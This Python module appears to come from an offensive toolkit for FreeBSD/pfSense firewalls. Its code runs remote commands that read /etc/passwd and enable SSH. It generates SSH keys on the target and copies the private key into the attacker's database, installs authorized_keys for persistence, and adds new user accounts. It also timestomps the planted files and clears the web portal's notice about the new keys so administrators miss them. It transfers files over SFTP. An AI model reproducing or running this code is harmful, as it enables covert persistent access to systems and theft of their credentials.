import Utils.Web as Web
import Commands
import Utils.Database

from paramiko import SSHClient, WarningPolicy, RSAKey
from pexpect import spawn
from os import chmod
from ipaddress import ip_address as check_ip
from time import sleep
from termcolor import cprint
from warnings import filterwarnings
filterwarnings("ignore")

def check_passwd(target:str, user:str) -> bool:
    all_users = []
    passwd = Commands.cmd_GET(target, "cat /etc/passwd", 0)
    users = passwd.split('\n')
    users.remove("# $FreeBSD$")
    users.remove('#')
    for u in users:
        all_users.append(u.split(':')[0])

    if(user not in all_users):
        cprint(f"{user} not found on host!", "red")
        return False
    else:
        return True

def toggle_ssh(target):
    # MAYBE ADD A WAY TO VERIFY IT WORKED!?
    # TELL IT WHAT U TOGGLED, WAS IT ENABLE OR DISABLED?
    toggle = "echo 'y' | /etc/rc.initial.toggle_sshd"
    output = Commands.cmd_GET(target, toggle, 0)
    if("Enabling SSHD" in output):
        cprint(f"SSH on ", "green", end="")
        cprint("enabled ", "yellow", end="")
        cprint(f"on ", "green", end="")
        cprint(f"{target.targetIp} ", "blue")
        
    else:
        cprint(f"SSH on ", "green", end="")
        cprint("disabled ", "red", end="")
        cprint(f"on ", "green", end="")
        cprint(f"{target.targetIp} ", "blue")

def add_user_ssh(target, user:str, username:str, password:str) -> None:
    ip = target.targetIp
    rsa_path = "current_id_rsa"

    # Connect to the remote server
    client = spawn(f"ssh {user}@{ip} -i {rsa_path} -o StrictHostKeyChecking=no")
    #client.logfile = open("pexpect_log", "wb")
    client.sendline("8")

    client.sendline("adduser")

    # Wait for the username prompt and send the password
    client.expect("Username: ")
    client.sendline(username)

    # Generic user guff
    client.expect("Full name: ")
    client.sendline("")

    client.expect("Uid.*")
    client.sendline("")

    client.expect("Login group.*")
    client.sendline("")

    client.expect("Login group is.*")
    client.sendline("")

    client.expect("Login class.*")
    client.sendline("")

    client.expect("Shell.*")
    client.sendline("")

    client.expect("Home dir.*")
    client.sendline("")

    client.expect("Home.*")
    client.sendline("")

    client.expect("Use password-based.*")
    client.sendline("")

    client.expect("Use an empty password?")
    client.sendline("")

    client.expect("Use a random password?")
    client.sendline("")

    # Password section finally
    client.expect("Enter password.*")
    client.sendline(password)

    client.expect("Enter password again.*")
    client.sendline(password)

    client.expect("Lock out*")
    client.sendline("")

    sleep(0.5)
    client.expect("OK?.*")
    client.sendline("yes")

    client.expect("Add.*")
    client.sendline("no")

    # Wait for the shell prompt
    sleep(0.5)

    client.close()

def cmd_ssh(target, user:str, cmd:str, showOutput:bool=True) -> str:
    output = ""
    ip = target.targetIp
    get_ssh_key(ip, user)
    print(f"[+] Cmd_SSH:User: {user}")
    rsa_path = "current_id_rsa"
    
    try:
        client = SSHClient()
        client.set_missing_host_key_policy(WarningPolicy)

        private_key = RSAKey(filename=rsa_path)
        # Connect to the remote server
        client.connect(ip, username=user, pkey=private_key)

        # Execute the command
        stdin, stdout, stderr = client.exec_command(cmd)

        # Print the command output
        output =  stdout.read().decode().strip()
        if(showOutput):
            if(output):
                cprint("Command Output:", "green")
                print(output)
            else:
                cprint("No Output", "red")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        # Close the SSH connection
        return output
        client.close()

def add_ssh_user(target):
    dbConn = Utils.Database()
    ip = target.targetIp

    ## DO YOU HAVE ROOT RSA KEY?
    # Checking if Database has keys for that IP
    try:
        if(dbConn.get_row("sshkeys", "ip", ip)):
            cprint("Username: ", "blue", end="")
            username = input()
            cprint("Password: ", "blue", end="")
            password = input()
            if(check_passwd(target, username)):
                cprint("User already exists!", "red")
                return
            cprint(f"Please wait... adding user ", "green", end="")
            cprint(f"{username}", "blue")
            get_ssh_key(ip, "root")
            add_user_ssh(target, "root", username, password)
            cprint(f"{username} added!", "green")
        else:
            cprint("No Root SSH key", "red")
    except Exception as error:
        print(error)
        cprint(f"Unable to add {username}", "red")
    
def get_ssh_key(ip, user):
    dbConn = Utils.Database()
    row = dbConn.get_sshkey(ip, user)[0] + '\n'
    with open("current_id_rsa", "w") as file_handle:
        file_handle.write(row)
        chmod("current_id_rsa", 0o600) # sorry 0o is octal

def add_ssh_key(target):
    dbConn = Utils.Database()
    user = "root" # Default user, root needed to create new keys/users
    home = "/root"
    ip = target.targetIp
    iplong = str(int(check_ip(ip)))

    ## DO YOU HAVE ROOT RSA KEY?
    # Checking if Database has keys for that IP
    if(dbConn.get_row("sshkeys", "ip", ip)):
        cprint("Username: ", "blue", end="")
        user = input()
        # Sets home e.g. /home/bob or /root depending on user
        home = f"/home/{user}"
        if not(check_passwd(target, user)): return # If user doesnt exist
    else:
        cprint("No Root Private Key Found, retreiving one now!", "yellow")


    # NEED ROOT RSA KEY TO MAKE USERS
    ## DOES KEY EXIST IN DB?
    # Create for key
    exists = Commands.cmd_GET(target, f"ls {home}/.ssh/id_rsa", 0)
    if("No such file" in exists):
        # Create SSH keys
        Commands.cmd_GET(target, f"mkdir {home}/.ssh", 0)
        Commands.cmd_GET(target, f"HOSTNAME=`hostname` ssh-keygen -t rsa -C '$HOSTNAME' -f '{home}/.ssh/id_rsa' -P '' && cat {home}/.ssh/id_rsa.pub", 0)
        Commands.cmd_GET(target, f"touch -r {home}/.cshrc {home}/.ssh", 0)
   
    id_rsa = Commands.cmd_GET(target, f"cat {home}/.ssh/id_rsa", 0)   

    # Add to database
    try:
        data = []
        data.append(ip)
        data.append(user)
        data.append(id_rsa)
        dbConn.set_key(data)
        cprint(f"{user}'s private key added to the database", "green")
    except:
        cprint(f"Unable to add {user}'s private key to the database", "red")

    # Create authorized keys so don't need password
    Commands.cmd_GET(target,  f"cp {home}/.ssh/id_rsa.pub {home}/.ssh/authorized_keys && chmod 600 {home}/.ssh/authorized_keys", 0)
    
    # Change ownership to the correct user
    if not(user == "root"):
        Commands.cmd_GET(target, f"chown {user} {home}/.ssh", 0)
        Commands.cmd_GET(target, f"chown {user} {home}/.ssh/id_rsa", 0)
        Commands.cmd_GET(target, f"chown {user} {home}/.ssh/id_rsa.pub", 0)
        Commands.cmd_GET(target, f"chown {user} {home}/.ssh/authorized_keys", 0)
    # Timestomp date
    Commands.cmd_GET(target, f"touch -r {home}/.cshrc {home}/.ssh", 0)
    Commands.cmd_GET(target, f"touch -r {home}/.cshrc {home}/.ssh/id_rsa", 0)
    Commands.cmd_GET(target, f"touch -r {home}/.cshrc {home}/.ssh/id_rsa.pub", 0)
    Commands.cmd_GET(target, f"touch -r {home}/.cshrc {home}/.ssh/authorized_keys", 0)
    
    # Removing alert from web portal "ssh keys created blah blah"
    postdata = "&closenotice=all"
    Web.simple_post(target, "/index.php", postdata, 0)
    
def transfer_file(target, user, direction):
    ip = target.targetIp
    get_ssh_key(ip, user)

    rsa_path = "current_id_rsa"

    ssh = SSHClient()
    ssh.set_missing_host_key_policy(WarningPolicy)
    private_key = RSAKey(filename=rsa_path)
    # Connect to the remote server
    ssh.connect(target.targetIp, username=user, pkey=private_key)
    sftp = ssh.open_sftp()
    cprint("Local File: ", "blue", end="")
    local = input()
    cprint("Remote File: ", "blue", end="")
    remote = input()
    # Upload
    if(direction == 0):
        try:
            sftp.put(local, remote)
        except:
            cprint("Unable to Upload ", "red", end="")
            cprint(f"{local}", "yellow")
    # Download
    elif(direction == 1):
        try:
            sftp.get(remote, local)
        except:
            cprint("Unable to download ", "red", end="")
            cprint(f"{remote}", "yellow")
    sftp.close()
    ssh.close()